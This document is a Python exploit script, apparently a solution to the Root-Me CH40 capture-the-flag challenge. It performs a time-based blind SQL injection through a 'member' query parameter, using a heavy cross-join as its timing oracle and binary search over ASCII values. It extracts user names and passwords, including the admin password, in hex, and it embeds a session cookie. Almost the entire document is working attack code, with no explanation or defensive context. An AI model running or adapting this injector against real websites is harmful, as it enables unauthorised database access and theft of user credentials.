#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 14 - DESCIFRANDO DATOS OFUSCADOS
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1, users T2)"
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition, repeats=3):
        payload = f"1 OR ({condition}) OR {self.heavy}"
        t = self.test_payload(payload, repeats=repeats)
        return t < self.threshold
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, max_len + 1):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
                if self.is_true(cond, repeats=2):
                    low = mid + 1
                else:
                    high = mid - 1
            
            char = chr(low)
            result += char
            print(f"  [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
        return result
    
    def extract_hex(self, query, label="Extrayendo HEX", max_len=100):
        """Extrae datos en formato HEX para ver el valor real"""
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, max_len + 1):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                cond = f"ASCII(SUBSTRING(HEX(({query})), {pos}, 1)) > {mid}"
                if self.is_true(cond, repeats=2):
                    low = mid + 1
                else:
                    high = mid - 1
            
            char = chr(low)
            result += char
            print(f"  [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
        return result

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("="*70)
print("  DESCIFRANDO DATOS OFUSCADOS")
print("="*70)

# 1. Extraer en HEX para ver valores reales
print("\n[1] Extrayendo datos en HEX:")

# Usuarios en HEX
for i in range(1, 5):
    query = f"SELECT HEX(user) FROM member LIMIT 1 OFFSET {i-1}"
    hex_user = injector.extract_hex(query, f"Usuario {i} HEX")
    print(f"  Usuario {i} HEX: {hex_user}")

# Contraseñas en HEX
for i in range(1, 5):
    query = f"SELECT HEX(password) FROM member LIMIT 1 OFFSET {i-1}"
    hex_pass = injector.extract_hex(query, f"Contraseña {i} HEX")
    print(f"  Contraseña {i} HEX: {hex_pass}")

# Admin en HEX
query_admin = f"SELECT HEX(user) FROM member WHERE user='admin'"
admin_hex = injector.extract_hex(query_admin, "Admin HEX")
print(f"  Admin HEX: {admin_hex}")

query_pass = f"SELECT HEX(password) FROM member WHERE user='admin'"
pass_hex = injector.extract_hex(query_pass, "Contraseña Admin HEX")
print(f"  Contraseña Admin HEX: {pass_hex}")

# 2. Extraer LENGTH para verificar longitudes reales
print("\n[2] Verificando longitudes reales:")
for i in range(1, 5):
    query = f"SELECT LENGTH(user) FROM member LIMIT 1 OFFSET {i-1}"
    length = injector.extract_string(query, f"Longitud usuario {i}")
    print(f"  Longitud usuario {i}: {length}")

# 3. Extraer usando CAST para ver valores numéricos
print("\n[3] Extrayendo como números:")
for i in range(1, 5):
    query = f"SELECT CAST(user AS UNSIGNED) FROM member LIMIT 1 OFFSET {i-1}"
    num = injector.extract_string(query, f"Usuario {i} como número")
    print(f"  Usuario {i} como número: {num}")

# 4. Extraer ORD (primer carácter) de cada usuario
print("\n[4] Extrayendo ORD de usuarios:")
for i in range(1, 5):
    query = f"SELECT ORD(user) FROM member LIMIT 1 OFFSET {i-1}"
    ord_val = injector.extract_string(query, f"ORD usuario {i}")
    print(f"  ORD usuario {i}: {ord_val}")
